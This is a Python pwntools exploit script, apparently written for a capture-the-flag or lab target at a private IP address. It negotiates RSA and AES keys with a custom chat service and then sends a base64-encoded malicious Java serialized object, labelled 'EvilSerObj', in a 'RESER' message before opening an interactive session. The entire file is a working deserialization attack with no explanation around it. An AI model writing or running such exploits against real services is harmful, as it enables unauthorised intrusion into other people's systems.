#!/usr/bin/python3

from pwn import *
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

from base64 import b64encode, b64decode

HOST = "192.168.192.187"; PORT = 1337

io = remote(HOST, PORT) 

EvilSerObj = "rO0ABXNyAB1jb20ubGlua2VkY2hhdC51dGlscyRSZXNlY09iaqEhHiEiSJDgAgADTAAMTmV3UHVibGljS2V5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAJUHVibGljS2V5cQB+AAFMAAluZXdTeW1LZXlxAH4AAXhwdAGITUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUExM01KV1NRQVpqR09KZjBEK1JvMUxiNkZTL0NVV1JQdWhDd3pFWllpL214b05ZVElpMTN5dGpJZ2pONkE3akNUeXk5WHA4RnIwT2lpclQySUVHVEExbHVsYk5EMUVhV2RnK2FwNXhVTVNrYlQxVWo3VnA1alRWalUxd0djdHFQTnhRdWE2S1E5TkJzVVFnbGlhMHFIUVI4SXVLTStvV01NS0JhMTdlSGNQL3V0QThSV0NOYXd5ZnpTYXdiTW5KM0RzY1IwM3p3WUluMmFZbmN1aVZNd3NscER3NUxRREl6Smo4M3QrdW42bGxMNDE4UmJkMjI5TjFOM04zZ0x2QlVaNjV2M0RreFdZTW9SRU5nYm43Mkt0Wjh6N3R2WEpROWpIUmlvYUcyQ1ZCM3RMNmN4V09xQXJVWFlXNWR6OEE2MzkwU3c3cWgxODhMczkrVjFuSkFlb1FJREFRQUJwcA=="

def generate_rsa_keypair():
    key = RSA.generate(2048)

    private_key = key
    public_key = key.publickey()
    
    return public_key, private_key

pubkey, prikey = generate_rsa_keypair()

def clean_key(key_pem):
    # Remove header and footer lines
    key_pem = key_pem.replace("-----BEGIN RSA PRIVATE KEY-----", "")
    key_pem = key_pem.replace("-----END RSA PRIVATE KEY-----", "")
    key_pem = key_pem.replace("-----BEGIN PUBLIC KEY-----", "")
    key_pem = key_pem.replace("-----END PUBLIC KEY-----", "")

    key_pem = key_pem.replace("\n", "")

    return key_pem.encode()

def rsaDecrypt(enc):
    global prikey
    de_rsa = PKCS1_v1_5.new(prikey)
    return de_rsa.decrypt(b64decode(enc), None)   

def getAesKey(symkey):
    pair = symkey.split(": ")[1].split(":")
    return pair

def encrypt(msg):
    global cipher, aesIv

    return b64encode(cipher.encrypt(pad(msg.encode('utf-8'), 
            AES.block_size)))



log.info("Sending public key...")
io.sendline(b"PUKEY: " + clean_key(pubkey.export_key().decode()))

SymKey = rsaDecrypt(io.recvline().decode()).decode()
log.info("SymKey: " + SymKey.split(": ")[1])

aesKey, aesIv = getAesKey(SymKey)
cipher = AES.new(b64decode(aesKey), AES.MODE_CBC, b64decode(aesIv))

io.sendline(encrypt("RESER: " + EvilSerObj))

io.interactive()
